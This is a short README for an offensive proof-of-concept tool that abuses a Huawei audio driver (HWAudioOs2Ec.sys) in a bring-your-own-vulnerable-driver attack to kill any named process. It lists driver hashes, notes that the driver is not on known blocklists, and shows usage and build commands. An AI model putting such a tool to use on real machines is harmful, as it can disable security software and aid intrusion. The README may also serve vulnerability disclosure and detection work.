# HWAudioOs2Ec-Killer
- PoC for vulnerability in HWAudioOs2Ec from Huawei Audio driver

- As of 2026-06-27, the driver is **not** listed on [LOLDDrivers](https://www.loldrivers.io/) or in [Microsoft's recommended driver block rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules)

Built on [`byovd-lib`](../byovd-lib/) -- implements the `DriverConfig` trait and delegates the full BYOVD flow to the shared library.

**Driver hashes:**
- `HWAudioOs2Ec.sys` SHA256: `5abe477517f51d81061d2e69a9adebdcda80d36667d0afabe103fda4802d33db`
- `HWAudioOs2Ec.sys` SHA256: `90d2e9e994ed8e964845a26dce741ad43b29ff54cf5faa67271d62d4e24acbc8`

## Usage

Place `HWAudioOs2Ec.sys` in the same directory as the executable.

```text
PS C:\Users\User\Desktop> .\HWAudioOs2Ec-Killer.exe -h
BYOVD process killer using HWAudioOs2Ec driver

Usage: HWAudioOs2Ec-Killer.exe --name <PROCESS_NAME>

Options:
  -n, --name <PROCESS_NAME>  Target process name (e.g., notepad.exe)
  -h, --help                 Print help
  -V, --version              Print version
```

```bash
# Build
cargo build --release -p HWAudioOs2Ec-Killer

# Run
.\HWAudioOs2Ec-Killer.exe -n notepad.exe
```
